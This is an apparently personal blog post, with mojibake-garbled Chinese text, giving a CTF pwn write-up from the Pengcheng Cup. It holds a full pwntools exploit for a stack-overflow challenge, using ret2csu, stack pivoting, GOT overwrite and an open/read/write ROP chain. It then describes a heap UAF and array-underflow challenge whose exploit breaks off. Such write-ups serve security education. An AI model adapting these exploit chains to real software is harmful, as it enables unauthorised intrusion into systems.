<!DOCTYPE html>
<html><head lang="en"><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
	<meta charset="utf-8" />
	<meta http-equiv="X-UA-Compatible" content="IE=edge"><title>é¹ç¨‹æ¯ - ldrx30</title><meta name="viewport" content="width=device-width, initial-scale=1">
	<meta name="description" content="
CTF PWN
" />
	<meta property="og:image" content=""/>
	<meta property="og:title" content="é¹ç¨‹æ¯" />
<meta property="og:description" content="
CTF PWN
" />
<meta property="og:type" content="article" />
<meta property="og:url" content="http://localhost:1313/posts/%E9%B9%8F%E7%A8%8B%E6%9D%AF-ctf/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2023-11-04T00:00:00+00:00" />
<meta property="article:modified_time" content="2023-11-04T00:00:00+00:00" />
<meta name="twitter:card" content="summary"/><meta name="twitter:title" content="é¹ç¨‹æ¯"/>
<meta name="twitter:description" content="
CTF PWN
"/>
<script src="http://localhost:1313/js/feather.min.js"></script>
	
	
        <link href="http://localhost:1313/css/fonts.2c2227b81b1970a03e760aa2e6121cd01f87c88586803cbb282aa224720a765f.css" rel="stylesheet">
	

	
	<link rel="stylesheet" type="text/css" media="screen" href="http://localhost:1313/css/main.5cebd7d4fb2b97856af8d32a6def16164fcf7d844e98e236fcb3559655020373.css" />
		<link id="darkModeStyle" rel="stylesheet" type="text/css" href="http://localhost:1313/css/dark.d22e2a2879d933a4b781535fc4c4c716e9f9d35ea4986dd0cbabda82effc4bdd.css"  disabled />
	

	
	
		<script type="text/javascript"
		src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
		</script>

		
		<script type="text/x-mathjax-config">
		MathJax.Hub.Config({
			tex2jax: {
				inlineMath: [['$','$'], ['\\(','\\)']],
				displayMath: [['$$','$$'], ['\[','\]']],
				processEscapes: true,
				processEnvironments: true,
				skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
				TeX: { equationNumbers: { autoNumber: "AMS" },
						 extensions: ["AMSmath.js", "AMSsymbols.js"] }
			}
		});
		</script>
	

	
	
		<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.css">
		<script defer src="https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.js"></script>
		<script defer src="https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/contrib/auto-render.min.js" onload="renderMathInElement(document.body);"></script>

		
		<script>
			document.addEventListener("DOMContentLoaded", function() {
					renderMathInElement(document.body, {
							delimiters: [
									{left: "$$", right: "$$", display: true},
									{left: "$", right: "$", display: false}
							]
					});
			});
			</script>
	

	
</head>
<body>
        <div class="content"><header>
	<div class="main">
		<a href="http://localhost:1313/">ldrx30</a>
	</div>
	<nav>
		
		<a href="/">Home</a>
		
		<a href="/posts">All posts</a>
		
		<a href="/about">About</a>
		
		| <span id="dark-mode-toggle" onclick="toggleTheme()"></span>
		<script src="http://localhost:1313/js/themetoggle.js"></script>
		
	</nav>
</header>

<main>
	<article>
		<div class="title">
			<h1 class="title">é¹ç¨‹æ¯</h1>
			<div class="meta">Posted on Nov 4, 2023</div>
		</div>
		

		

		<section class="body">
			<blockquote>
<p>CTF PWN</p>
</blockquote>
<p>è°ƒè¯•æ—¶å»é™¤alarmå‡½æ•°ï¼šä½¿ç”¨16è¿›åˆ¶ç¼–è¾‘å™¨ï¼Œå°†æ‰€æœ‰çš„alarmæ”¹æˆ <code>isnan</code></p>
<p>æˆ–è€…ä½¿ç”¨å‘½ä»¤</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sed -i s/alarm/isnan/g &lt;äºŒè¿›åˆ¶æ–‡ä»¶&gt;
</span></span></code></pre></div><h2 id="slient">slient</h2>
<p>å¼€å¯PIEå’ŒNXä¿æŠ¤ï¼Œæ¼æ´ç‚¹æ˜¯ä¸€ä¸ªæ ˆæº¢å‡ºã€‚</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#8be9fd">int</span> <span style="color:#ff79c6">__cdecl</span> <span style="color:#50fa7b">main</span>(<span style="color:#8be9fd">int</span> argc, <span style="color:#ff79c6">const</span> <span style="color:#8be9fd">char</span> <span style="color:#ff79c6">**</span>argv, <span style="color:#ff79c6">const</span> <span style="color:#8be9fd">char</span> <span style="color:#ff79c6">**</span>envp)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">char</span> buf[<span style="color:#bd93f9">64</span>]; <span style="color:#6272a4">// [rsp+10h] [rbp-40h] BYREF
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>
</span></span><span style="display:flex;"><span>  init_seccomp(argc, argv, envp);
</span></span><span style="display:flex;"><span>  setvbuf(stdin, <span style="color:#bd93f9">0LL</span>, <span style="color:#bd93f9">2</span>, <span style="color:#bd93f9">0LL</span>);
</span></span><span style="display:flex;"><span>  setvbuf(stdout, <span style="color:#bd93f9">0LL</span>, <span style="color:#bd93f9">2</span>, <span style="color:#bd93f9">0LL</span>);
</span></span><span style="display:flex;"><span>  read(<span style="color:#bd93f9">0</span>, buf, <span style="color:#bd93f9">0x100uLL</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">return</span> <span style="color:#bd93f9">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>æ²¡æœ‰putsï¼Œwriteç­‰å¯ä»¥è¿›è¡Œæ³„éœ²çš„å‡½æ•°ã€‚æ€è·¯ä¸ºå°†æŸäº›å‡½æ•°çš„gotè¡¨è¯»å…¥bssæ®µï¼Œä½¿ç”¨ret2csuã€‚</p>
<ul>
<li>è¯»gotè¡¨éœ€è¦gadgetè‡³å°‘å­˜åœ¨å¯ä»¥ä¿®æ”¹åœ°å€å†…å®¹ç‰‡æ®µï¼Œå½¢å¦‚ <code>mov [xxx], xxx</code> ã€‚ç”¨äºå–å€¼ï¼Œè€Œä¸”éœ€è¦æˆ‘ä»¬å¯ä»¥æ§åˆ¶å¯„å­˜å™¨çš„å†…å®¹</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ ROPgadget --binary silent
</span></span><span style="display:flex;"><span>0x00000000004007e8 : add dword ptr <span style="color:#ff79c6">[</span>rbp - 0x3d<span style="color:#ff79c6">]</span>, ebx ; nop dword ptr <span style="color:#ff79c6">[</span>rax + rax<span style="color:#ff79c6">]</span> ; repz ret
</span></span></code></pre></div><ol>
<li>æ ˆæº¢å‡ºï¼Œä½¿ç”¨ret2csuï¼Œå‘bssæ®µè¯»å…¥ROP chainã€‚</li>
<li>æ ˆè¿ç§»ï¼Œè½¬åˆ°bssæ®µçš„ROPchainæ‰§è¡Œ</li>
</ol>
<ul>
<li>ä½¿ç”¨magic ä¿®æ”¹read_got è¡¨å†…å®¹ä¸ºsyscall</li>
<li>æ³„éœ²å‡ºlibc_base</li>
<li>ç»§ç»­read ROPchianï¼Œæ ˆè¿ç§»æ‰§è¡ŒROPchain</li>
</ul>
<p>éœ€è¦æ³¨æ„</p>
<ul>
<li>å–magic gadgetä¸­çš„ebxæ—¶ï¼Œå¦‚æœebxçš„å€¼ä¸ºæ­£ï¼Œåˆ™ç›´æ¥å–ï¼Œå¦‚æœä¸º<strong>è´Ÿï¼ŒåŠ 0x100000000å–è¡¥ç </strong>ã€‚</li>
<li>æ§åˆ¶raxï¼Œä½¿ç”¨å‡½æ•°è¿”å›å€¼æ˜¯raxæ¥æ§åˆ¶</li>
<li>æ ˆè¿ç§»çš„é‡ç‚¹æ˜¯æ§åˆ¶rspï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨ pop_rsp ç›´æ¥æ§åˆ¶ã€‚</li>
</ul>
<p>æœ€ç»ˆçš„exp</p>
<ul>
<li>è°ƒè¯•äºŒä¸‰åæ¬¡æ‰æ˜ç™½ï¼Œ<del>ä½†æ˜¯å¾ˆå¿«å°±ä¼šå¿˜</del>ã€‚</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#6272a4">#!/usr/bin/python3</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">from</span> pwn <span style="color:#ff79c6">import</span> <span style="color:#ff79c6">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">s</span>(data): <span style="color:#ff79c6">return</span> p<span style="color:#ff79c6">.</span>send(data)
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">r</span>(num<span style="color:#ff79c6">=</span><span style="color:#bd93f9">4096</span>): <span style="color:#ff79c6">return</span> p<span style="color:#ff79c6">.</span>recv(num)
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">ru</span>(delim, drop<span style="color:#ff79c6">=</span><span style="color:#ff79c6">False</span>): <span style="color:#ff79c6">return</span> p<span style="color:#ff79c6">.</span>recvuntil(delim, drop)
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">itr</span>(): <span style="color:#ff79c6">return</span> p<span style="color:#ff79c6">.</span>interactive()
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">lg</span>(name): <span style="color:#ff79c6">return</span> log<span style="color:#ff79c6">.</span>success(
</span></span><span style="display:flex;"><span>    <span style="color:#f1fa8c">&#39;</span><span style="color:#f1fa8c">\033</span><span style="color:#f1fa8c">[32m</span><span style="color:#f1fa8c">%s</span><span style="color:#f1fa8c"> ==&gt; 0x</span><span style="color:#f1fa8c">%x</span><span style="color:#f1fa8c">\033</span><span style="color:#f1fa8c">[0m&#39;</span> <span style="color:#ff79c6">%</span> (name, <span style="color:#8be9fd;font-style:italic">eval</span>(name)))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">uu64</span>(): <span style="color:#ff79c6">return</span> u64(p<span style="color:#ff79c6">.</span>recvuntil(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\x7f</span><span style="color:#f1fa8c">&#34;</span>)[<span style="color:#ff79c6">-</span><span style="color:#bd93f9">6</span>:]<span style="color:#ff79c6">.</span>ljust(<span style="color:#bd93f9">8</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\x00</span><span style="color:#f1fa8c">&#34;</span>))
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">dbg</span>(p): gdb<span style="color:#ff79c6">.</span>attach(p)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>file <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;silent_patched&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>elf <span style="color:#ff79c6">=</span> ELF(file, checksec<span style="color:#ff79c6">=</span><span style="color:#ff79c6">False</span>)
</span></span><span style="display:flex;"><span>libc <span style="color:#ff79c6">=</span> elf<span style="color:#ff79c6">.</span>libc
</span></span><span style="display:flex;"><span>context<span style="color:#ff79c6">.</span>binary <span style="color:#ff79c6">=</span> elf
</span></span><span style="display:flex;"><span>context<span style="color:#ff79c6">.</span>log_level <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;DEBUG&#39;</span>
</span></span><span style="display:flex;"><span>context<span style="color:#ff79c6">.</span>terminal <span style="color:#ff79c6">=</span> [<span style="color:#f1fa8c">&#39;tmux&#39;</span>, <span style="color:#f1fa8c">&#39;splitw&#39;</span>, <span style="color:#f1fa8c">&#39;-h&#39;</span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p <span style="color:#ff79c6">=</span> elf<span style="color:#ff79c6">.</span>process()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>pop_rbp_ret <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x0000000000400788</span>
</span></span><span style="display:flex;"><span>pop_rdi_ret <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x0000000000400963</span>
</span></span><span style="display:flex;"><span>pop_rsi_r15_ret <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x0000000000400961</span>
</span></span><span style="display:flex;"><span>ret <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x0000000000400696</span>
</span></span><span style="display:flex;"><span>leave_ret <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x0000000004008FC</span>
</span></span><span style="display:flex;"><span>pop_rsp_r13_r14_r15 <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x000000000040095d</span>
</span></span><span style="display:flex;"><span>magic <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x00000000004007e8</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>read_plt <span style="color:#ff79c6">=</span> elf<span style="color:#ff79c6">.</span>plt<span style="color:#ff79c6">.</span>read
</span></span><span style="display:flex;"><span>read_got <span style="color:#ff79c6">=</span> elf<span style="color:#ff79c6">.</span>got<span style="color:#ff79c6">.</span>read
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>csu_front <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x400940</span>
</span></span><span style="display:flex;"><span>csu_end <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x40095A</span>
</span></span><span style="display:flex;"><span>bss <span style="color:#ff79c6">=</span> elf<span style="color:#ff79c6">.</span>bss()
</span></span><span style="display:flex;"><span>stdout <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x601020</span>
</span></span><span style="display:flex;"><span>main_addr <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x0400878</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f1fa8c">&#39;&#39;&#39;
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">csu:    0, 1, call, rdi, rsi, rdx
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">.text:0000000000400940 4C 89 FA                      mov     rdx, r15
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">.text:0000000000400943 4C 89 F6                      mov     rsi, r14
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">.text:0000000000400946 44 89 EF                      mov     edi, r13d
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">.text:0000000000400949 41 FF 14 DC                   call    ds:(__frame_dummy_init_array_entry - 600D90h)[r12+rbx*8]
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">.text:0000000000400949
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">.text:000000000040094D 48 83 C3 01                   add     rbx, 1
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">.text:0000000000400951 48 39 DD                      cmp     rbp, rbx
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">.text:0000000000400954 75 EA                         jnz     short loc_400940
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">.text:0000000000400954
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">.text:0000000000400956
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">.text:0000000000400956                               loc_400956:                             ; CODE XREF: __libc_csu_init+34â†‘j
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">.text:0000000000400956 48 83 C4 08                   add     rsp, 8
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">.text:000000000040095A 5B                            pop     rbx
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">.text:000000000040095B 5D                            pop     rbp
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">.text:000000000040095C 41 5C                         pop     r12
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">.text:000000000040095E 41 5D                         pop     r13
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">.text:0000000000400960 41 5E                         pop     r14
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">.text:0000000000400962 41 5F                         pop     r15
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">.text:0000000000400964 C3                            retn
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">&#39;&#39;&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p1 <span style="color:#ff79c6">=</span> cyclic(<span style="color:#bd93f9">64</span> <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">8</span>)
</span></span><span style="display:flex;"><span>p1 <span style="color:#ff79c6">+=</span> flat([
</span></span><span style="display:flex;"><span>    csu_end, <span style="color:#bd93f9">0</span>, <span style="color:#bd93f9">1</span>, read_got, <span style="color:#bd93f9">0</span>, bss<span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x800</span>, <span style="color:#bd93f9">0x400</span>,
</span></span><span style="display:flex;"><span>    csu_front, <span style="color:#bd93f9">0</span>, <span style="color:#bd93f9">0</span>, bss<span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x800</span>, <span style="color:#bd93f9">0</span>, <span style="color:#bd93f9">0</span>, <span style="color:#bd93f9">0</span>, <span style="color:#bd93f9">0</span>,
</span></span><span style="display:flex;"><span>    leave_ret
</span></span><span style="display:flex;"><span>])
</span></span><span style="display:flex;"><span>s(p1)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4"># bss ROP chain</span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4"># è°ƒç”¨bssæ®µçš„ä»£ç ï¼Œç„¶åæœ€å pop rbp ç»™rbpæŒ‡å®šä¸€ä¸ªå€¼ï¼Œå°±æ˜¯ stdout+0x3d</span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4"># è°ƒç”¨magic gadget ï¼Œ[stdout] å†…å®¹</span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4"># 0x00000000004007e8 : add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax + rax] ; repz ret</span>
</span></span><span style="display:flex;"><span><span style="color:#f1fa8c">&#39;&#39;&#39;
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">pwndbg&gt; x/2xg &amp;stdout
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">0x601020 &lt;stdout@@GLIBC_2.2.5&gt;: 0x00007fc4d7fec760      0x0000000000000000
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">pwndbg&gt; p syscall
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">$1 = {&lt;text variable, no debug info&gt;} 0x7fc4d7d1b520 &lt;syscall&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">pwndbg&gt; x/10wi 0x7fc4d7d1b520
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">   0x7fc4d7d1b520 &lt;syscall&gt;:    mov    rax,rdi
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">   0x7fc4d7d1b523 &lt;syscall+3&gt;:  mov    rdi,rsi
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">   0x7fc4d7d1b526 &lt;syscall+6&gt;:  mov    rsi,rdx
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">   0x7fc4d7d1b529 &lt;syscall+9&gt;:  mov    rdx,rcx
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">   0x7fc4d7d1b52c &lt;syscall+12&gt;: mov    r10,r8
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">   0x7fc4d7d1b52f &lt;syscall+15&gt;: mov    r8,r9
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">   0x7fc4d7d1b532 &lt;syscall+18&gt;: mov    r9,QWORD PTR [rsp+0x8]
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">   0x7fc4d7d1b537 &lt;syscall+23&gt;: syscall
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">   0x7fc4d7d1b539 &lt;syscall+25&gt;: cmp    rax,0xfffffffffffff001
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">   0x7fc4d7d1b53f &lt;syscall+31&gt;: jae    0x7fc4d7d1b542 &lt;syscall+34&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">   
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">pwndbg&gt; p write
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">$2 = {&lt;text variable, no debug info&gt;} 0x7fc4d7d100f0 &lt;write&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">&#39;&#39;&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p2 <span style="color:#ff79c6">=</span> flat([
</span></span><span style="display:flex;"><span>    stdout<span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x3d</span>,                        <span style="color:#6272a4"># rbp</span>
</span></span><span style="display:flex;"><span>    csu_end, <span style="color:#bd93f9">0x100000000</span><span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x7fc4d7d1b537</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0x00007fc4d7fec760</span>, stdout<span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x3d</span>, <span style="color:#bd93f9">0</span>, <span style="color:#bd93f9">0</span>, <span style="color:#bd93f9">0</span>, <span style="color:#bd93f9">0</span>,
</span></span><span style="display:flex;"><span>    magic,                                                      <span style="color:#6272a4"># å°†stdout æ”¹æˆsyscall</span>
</span></span><span style="display:flex;"><span>    csu_end, <span style="color:#bd93f9">0</span>, <span style="color:#bd93f9">1</span>, read_got, <span style="color:#bd93f9">0</span>, bss<span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x1000</span>, <span style="color:#bd93f9">0x1</span>,                <span style="color:#6272a4"># å‡½æ•°è¿”å›å€¼ä¸ºrax</span>
</span></span><span style="display:flex;"><span>    csu_front, <span style="color:#bd93f9">0</span>, <span style="color:#bd93f9">0</span>, <span style="color:#bd93f9">1</span>, stdout, <span style="color:#bd93f9">1</span>, read_got, <span style="color:#bd93f9">8</span>,                 <span style="color:#6272a4"># syscall (1, 1, read_got, 8)ã€‚</span>
</span></span><span style="display:flex;"><span>    csu_front, <span style="color:#bd93f9">0</span>, <span style="color:#bd93f9">0</span>, <span style="color:#bd93f9">1</span>, read_got, <span style="color:#bd93f9">0</span>, bss<span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x1000</span>, <span style="color:#bd93f9">0x100</span>,         <span style="color:#6272a4"># è¯»å…¥ç¬¬äºŒä¸ªROPchian</span>
</span></span><span style="display:flex;"><span>    csu_front, <span style="color:#bd93f9">0</span>, <span style="color:#bd93f9">0</span>, bss<span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x1000</span>, <span style="color:#bd93f9">0</span>, <span style="color:#bd93f9">0</span>, <span style="color:#bd93f9">0</span>, <span style="color:#bd93f9">0</span>,
</span></span><span style="display:flex;"><span>    leave_ret                                                   <span style="color:#6272a4"># è¿ç§»åˆ°ç¬¬äºŒä¸ªbss_chain</span>
</span></span><span style="display:flex;"><span>])
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>dbg(p)
</span></span><span style="display:flex;"><span>s(p2)
</span></span><span style="display:flex;"><span>pause()
</span></span><span style="display:flex;"><span>s(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;a&#34;</span>)
</span></span><span style="display:flex;"><span>leak <span style="color:#ff79c6">=</span> uu64()
</span></span><span style="display:flex;"><span>libc<span style="color:#ff79c6">.</span>address <span style="color:#ff79c6">=</span> leak <span style="color:#ff79c6">-</span> libc<span style="color:#ff79c6">.</span>sym<span style="color:#ff79c6">.</span>read
</span></span><span style="display:flex;"><span>lg(<span style="color:#f1fa8c">&#34;libc.address&#34;</span>)
</span></span><span style="display:flex;"><span>lg(<span style="color:#f1fa8c">&#34;bss&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>open_addr <span style="color:#ff79c6">=</span> libc<span style="color:#ff79c6">.</span>sym[<span style="color:#f1fa8c">&#39;open&#39;</span>]
</span></span><span style="display:flex;"><span>write_addr <span style="color:#ff79c6">=</span> libc<span style="color:#ff79c6">.</span>sym[<span style="color:#f1fa8c">&#39;write&#39;</span>]
</span></span><span style="display:flex;"><span>read_addr <span style="color:#ff79c6">=</span> libc<span style="color:#ff79c6">.</span>sym[<span style="color:#f1fa8c">&#39;read&#39;</span>]
</span></span><span style="display:flex;"><span>flag_addr <span style="color:#ff79c6">=</span> bss<span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x1000</span>
</span></span><span style="display:flex;"><span>pop_rdx_ret <span style="color:#ff79c6">=</span> libc<span style="color:#ff79c6">.</span>search(asm(<span style="color:#f1fa8c">&#34;pop rdx; ret&#34;</span>))<span style="color:#ff79c6">.</span>__next__() 
</span></span><span style="display:flex;"><span>pop_rsi_ret <span style="color:#ff79c6">=</span> libc<span style="color:#ff79c6">.</span>search(asm(<span style="color:#f1fa8c">&#34;pop rsi; ret&#34;</span>))<span style="color:#ff79c6">.</span>__next__() 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>rop_chian <span style="color:#ff79c6">=</span> flat([
</span></span><span style="display:flex;"><span>    <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#39;flag</span><span style="color:#f1fa8c">\x00\x00\x00\x00</span><span style="color:#f1fa8c">&#39;</span>,  <span style="color:#6272a4"># å¡«å……8å­—èŠ‚</span>
</span></span><span style="display:flex;"><span>    pop_rdi_ret, flag_addr, pop_rsi_ret, <span style="color:#bd93f9">0</span>, open_addr,
</span></span><span style="display:flex;"><span>    pop_rdi_ret, <span style="color:#bd93f9">3</span>, pop_rsi_ret, bss<span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x400</span>, pop_rdx_ret, <span style="color:#bd93f9">0x30</span>, read_addr,
</span></span><span style="display:flex;"><span>    pop_rdi_ret, <span style="color:#bd93f9">1</span>, pop_rsi_ret, bss<span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x400</span>, pop_rdx_ret, <span style="color:#bd93f9">0x30</span>, write_addr,
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>])
</span></span><span style="display:flex;"><span>pause()
</span></span><span style="display:flex;"><span>s(rop_chian)
</span></span><span style="display:flex;"><span>itr()
</span></span></code></pre></div><h2 id="atuo_coffee_sale_machine">atuo_coffee_sale_machine</h2>
<p>coffee_list: å­˜å‚¨å’–å•¡ä¿¡æ¯ã€‚
ä¸¤ä¸ªcoffee_leftæ•°ç»„ï¼Œåˆ†åˆ«æ˜¯ user å’Œ adminï¼Œæ˜¯ä¸€ä¸ª <code>3*7</code> æ•°ç»„ï¼Œidå’Œposition</p>
<p>user</p>
<ul>
<li>è´­ä¹°ï¼Œè¾“å…¥idï¼ŒæŒ‰ç…§posé¡ºåºè¿›è¡Œfree</li>
<li>æŸ¥çœ‹ï¼Œæ‰“å°å‡º coffee_list ä¿¡æ¯</li>
</ul>
<p>admin</p>
<ul>
<li>replenishï¼šå…ˆæ›´æ–°admin coffee_listï¼Œç„¶åæ›´æ–° user coffee_left</li>
<li>change_defaultï¼Œè¾“å…¥idå’Œposæ›´æ–°å†…å®¹ï¼Œç„¶åæ›´æ–°user coffee_left</li>
</ul>
<p>å­˜åœ¨ä¸¤ä¸ªé—®é¢˜ï¼Œéƒ½å¯ä»¥è¿›è¡Œæ³„éœ²å’Œ get shell</p>
<ul>
<li>adminåœ¨ change_default ä½¿ï¼Œæ²¡æœ‰å…ˆè¿›è¡Œupdateï¼Œç›´æ¥readä¼šå¯¼è‡´uafé—®é¢˜</li>
<li>æ•°ç»„underflowï¼Œå› ä¸ºè¯»å…¥çš„id, pos æ²¡æœ‰åˆ¤æ–­æ˜¯å¦å°äº0ã€‚</li>
</ul>
<p>expå¦‚ä¸‹</p>
<ul>
<li>ç”±äºchange_defaultå­˜åœ¨æ›´æ–°ï¼Œå®¹æ˜“å¯¼è‡´double free å’Œ æ— æ³•  replenish çš„é”™è¯¯ï¼Œæˆ‘ä»¬éœ€è¦ä¸­é€”æ›´æ–°ä¸€ä¸‹admin coffee_leftã€‚ï¼ˆ<del>èœé¸¡çš„çœ¼æ³ª</del></li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#6272a4">#!/usr/bin/python3</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">from</span> pwn <span style="color:#ff79c6">import</span> <span style="color:#ff79c6">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">s</span>(data): <span style="color:#ff79c6">return</span> p<span style="color:#ff79c6">.</span>send(data)
